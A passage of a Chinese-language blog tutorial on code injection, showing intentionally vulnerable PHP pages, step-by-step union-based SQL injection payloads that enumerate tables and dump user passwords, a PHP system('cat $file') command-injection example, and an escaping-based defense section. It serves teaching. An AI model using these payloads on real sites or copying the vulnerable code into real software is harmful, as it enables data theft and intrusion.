<span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">	<span class="variable">$row</span>    = <span class="title function_ invoke__">mysqli_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line">	<span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><code>sql.php</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">        &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css&quot;</span> integrity=<span class="string">&quot;sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb&quot;</span> crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;https://code.jquery.com/jquery-3.2.1.slim.min.js&quot;</span> integrity=<span class="string">&quot;sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN&quot;</span> crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js&quot;</span> integrity=<span class="string">&quot;sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh&quot;</span> crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js&quot;</span> integrity=<span class="string">&quot;sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ&quot;</span> crossorigin=<span class="string">&quot;anonymous&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;title&gt;SQL 注入&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        <span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_POST</span>[content]) &#123;</span><br><span class="line">            <span class="variable">$db_host</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">			<span class="variable">$db_user</span> = <span class="string">&quot;my_user&quot;</span>;</span><br><span class="line">			<span class="variable">$db_password</span> = <span class="string">&quot;my_password&quot;</span>;</span><br><span class="line">			<span class="variable">$db_name</span> = <span class="string">&quot;my_db&quot;</span>;</span><br><span class="line">            <span class="variable">$content</span> = <span class="variable">$_POST</span>[content];</span><br><span class="line">            <span class="variable">$query</span> = <span class="string">&quot;SELECT first_name,last_name FROM users WHERE user_id = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$db_host</span>,<span class="variable">$db_user</span>,<span class="variable">$db_password</span>,<span class="variable">$db_name</span>);</span><br><span class="line">            <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>)) &#123;</span><br><span class="line">                	<span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">			<span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;No Found!&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_POST</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t get your content!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p><code>user.html</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-PsH8R72JQ3SOdhVi3uxftmaW6Vc51MKb0q5P2rRUpPvrszuE4W1povHYgTpBfshb&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://code.jquery.com/jquery-3.2.1.slim.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.3/umd/popper.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-vFJXuSJphROIrBnz7yo7oB41mKfc8JzQZiCq4NCceLEaO4IHwicKwpJf9c9IpFgh&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js&quot;</span> <span class="attr">integrity</span>=<span class="string">&quot;sha384-alpBpkh1PFOepccYVYDB4do5UnbKysX5WZXm3XxPqe5iKTfUKjNkCk9SaVuEZflJ&quot;</span> <span class="attr">crossorigin</span>=<span class="string">&quot;anonymous&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  		<span class="selector-tag">div</span>&#123;</span></span><br><span class="line"><span class="language-css">		    <span class="attribute">border</span>:<span class="number">1px</span>;</span></span><br><span class="line"><span class="language-css">		    <span class="attribute">width</span>:<span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">		    <span class="attribute">margin</span>:<span class="number">20px</span> auto;</span></span><br><span class="line"><span class="language-css">		  &#125;</span></span><br><span class="line"><span class="language-css">	</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>sql 注入测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;card-body&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;medium.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">			Username:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">			Password:<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="初步注入"><a href="#初步注入" class="headerlink" title="初步注入"></a>初步注入</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br></pre></td></tr></table></figure>
+<h3 id="猜测查询语句的字段数"><a href="#猜测查询语句的字段数" class="headerlink" title="猜测查询语句的字段数"></a>猜测查询语句的字段数</h3><p>即要对查询语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name,last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;$content&#x27;</span></span><br></pre></td></tr></table></figure><br>中的<code>SELECT</code>字段进行猜测<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; or 1=1 order by 1 #</span></span><br><span class="line"><span class="string">1&#x27;</span> or 1=1 order by 2 <span class="comment">#</span></span><br><span class="line">1<span class="string">&#x27; or 1=1 order by 3 #</span></span><br></pre></td></tr></table></figure><br>尝试到3时出现<code>No Found</code>说明<code>SELECT</code>里有两个字段数</p>
+<h3 id="查询刚刚猜测的字段顺序"><a href="#查询刚刚猜测的字段顺序" class="headerlink" title="查询刚刚猜测的字段顺序"></a>查询刚刚猜测的字段顺序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,2 #</span></span><br></pre></td></tr></table></figure>
+<p><code>sql</code>语法<code>union</code>是将两个集合去重合并，相当于原本返回<code>admin,admin</code>，现在又存在<code>1,2</code>，通过<code>union</code>后就是两行数据</p>
+<h3 id="获取当前数据库名"><a href="#获取当前数据库名" class="headerlink" title="获取当前数据库名"></a>获取当前数据库名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,database() #</span></span><br></pre></td></tr></table></figure>
+<p><code>database()</code>是数据库系统信息函数，作用是获取当前数据库名，其他数据库信息函数有</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>version()</td>
+<td>获取数据库的版本号</td>
+</tr>
+<tr>
+<td>connection_id()</td>
+<td>获取数据库的连接数</td>
+</tr>
+<tr>
+<td>database();schema()</td>
+<td>获取当前数据库名</td>
+</tr>
+<tr>
+<td>user();system_user()</td>
+<td>获取当前用户</td>
+</tr>
+<tr>
+<td>current_user()</td>
+<td>获取当前用户</td>
+</tr>
+<tr>
+<td>charset(str)</td>
+<td>获取字符串str的字符集</td>
+</tr>
+<tr>
+<td>collation(str)</td>
+<td>获取字符串str的字符排列方式</td>
+</tr>
+</tbody>
+</table>
+<h3 id="获取当前表名"><a href="#获取当前表名" class="headerlink" title="获取当前表名"></a>获取当前表名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br></pre></td></tr></table></figure>
+<p><code>mysql</code>在创建时默认创建一个information_schema数据库，在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</p>
+<p><code>information_schema</code>数据库表说明:</p>
+<ul>
+<li><code>SCHEMATA</code>表：提供了当前mysql实例中所有数据库的信息。<code>show databases</code>的结果取之此表。</li>
+<li><code>TABLES</code>表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。<code>show tables from schemaname</code>的结果取之此表。</li>
+<li><code>COLUMNS</code>表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<code>show columns from schemaname.tablename</code>的结果取之此表。</li>
+<li><code>STATISTICS</code>表：提供了关于表索引的信息。<code>show index from schemaname.tablename</code>的结果取之此表。</li>
+<li><code>USER_PRIVILEGES</code>（用户权限）表：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。</li>
+<li><code>VIEWS</code>表：给出了关于数据库中的视图的信息。需要有<code>show views</code>权限，否则无法查看视图信息</li>
+<li><code>TRIGGERS</code>表：提供了关于触发程序的信息。必须有super权限才能查看该表</li>
+</ul>
+<h3 id="获取当前表字段名"><a href="#获取当前表字段名" class="headerlink" title="获取当前表字段名"></a>获取当前表字段名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+<h3 id="获取所有数据"><a href="#获取所有数据" class="headerlink" title="获取所有数据"></a>获取所有数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</span></span><br></pre></td></tr></table></figure>
+<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><div class="video-container"><iframe src="https://www.youtube.com/embed/UwJr-RsEy58" frameborder="0" loading="lazy" allowfullscreen></iframe></div>
+<h2 id="php-注入"><a href="#php-注入" class="headerlink" title="php 注入"></a>php 注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;查看文件&quot;</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;cat <span class="subst">$file</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>与c代码注入类似，基本在于调用系统的命令来获取结果，诸如php获取系统版本、mysql版本、服务器时间、Web服务器类型等等系统信息，使用系统命令，都可能会产生注入漏洞。在本例中仍然可以在url中注入一些系统命令。</p>
+<h2 id="注入防范"><a href="#注入防范" class="headerlink" title="注入防范"></a>注入防范</h2><p>明白注入的基本方式和原理，很容易知道，通过输入检查来预防注入。获取到输入的字符串，对字符串进行过滤、转义等操作，只不过诸如php的不同输入检查函数，不同的函数的检查方法不一样，但有可能仍然存在编写者本身没有考虑到的可能性，这就导致了漏洞不间断出现。在使用这些检查函数时，要认真查看函数的检查方法以及过滤的东西。在此举个例子:</p>
+<p><code>mysqli_real_escape_string( mysqli $link , string $escapestr)</code>:</p>
+<ul>
+<li>Parameters:<ul>
+<li>link: Procedural style only: A link identifier returned by mysqli_connect() or mysqli_init()</li>
+<li>escapestr: The string to be escaped. Characters encoded are NUL (ASCII 0), \n, \r, \, ‘, “, and Control-Z.</li>
+</ul>
+</li>
+<li>Return Value:<ul>
+<li>Returns an escaped string.</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;my_user&quot;</span>, <span class="string">&quot;my_password&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* check connection */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Connect failed: %s\n&quot;</span>, <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;CREATE TEMPORARY TABLE myCity LIKE City&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$city</span> = <span class="string">&quot;&#x27;s Hertogenbosch&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* this query will fail, cause we didn&#x27;t escape $city */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;INSERT into myCity (Name) VALUES (&#x27;<span class="subst">$city</span>&#x27;)&quot;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Error: %s\n&quot;</span>, <span class="variable">$mysqli</span>-&gt;sqlstate);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$city</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$city</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* this query with escaped $city will work */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;INSERT into myCity (Name) VALUES (&#x27;<span class="subst">$city</span>&#x27;)&quot;</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%d Row inserted.\n&quot;</span>, <span class="variable">$mysqli</span>-&gt;affected_rows);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="引用地址"><a href="#引用地址" class="headerlink" title="引用地址"></a>引用地址</h2><ul>
+<li><a target="_blank" rel="noopener" href="http://www.freebuf.com/articles/web/120747.html">http://www.freebuf.com/articles/web/120747.html</a></li>
+<li><a target="_blank" rel="noopener" href="http://topspeedsnail.com/hack-command-injection-attack/">http://topspeedsnail.com/hack-command-injection-attack/</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/centos/" rel="tag"><i class="fa fa-tag"></i> centos</a>
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> 代码注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/12/11/%E5%88%86%E4%BA%AB%E4%BC%9A%E8%B5%84%E6%96%99/" rel="prev" title="分享会资料">
+      <i class="fa fa-chevron-left"></i> 分享会资料
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/01/31/storm/" rel="next" title="Storm">
+      Storm <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the comments powered by Disqus.</noscript>
+    </div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#c%E7%A8%8B%E5%BA%8F%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="nav-number">1.</span> <span class="nav-text">c程序代码注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">SQL代码注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%AD"><span class="nav-number">3.</span> <span class="nav-text">SQL注入续</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E6%AD%A5%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">初步注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8C%9C%E6%B5%8B%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="nav-number">3.2.</span> <span class="nav-text">猜测查询语句的字段数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%88%9A%E5%88%9A%E7%8C%9C%E6%B5%8B%E7%9A%84%E5%AD%97%E6%AE%B5%E9%A1%BA%E5%BA%8F"><span class="nav-number">3.3.</span> <span class="nav-text">查询刚刚猜测的字段顺序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">3.4.</span> <span class="nav-text">获取当前数据库名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E8%A1%A8%E5%90%8D"><span class="nav-number">3.5.</span> <span class="nav-text">获取当前表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">3.6.</span> <span class="nav-text">获取当前表字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%89%80%E6%9C%89%E6%95%B0%E6%8D%AE"><span class="nav-number">3.7.</span> <span class="nav-text">获取所有数据</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%86%E9%A2%91"><span class="nav-number">3.8.</span> <span class="nav-text">视频</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">php 注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E9%98%B2%E8%8C%83"><span class="nav-number">5.</span> <span class="nav-text">注入防范</span></a></li><li class="nav-item 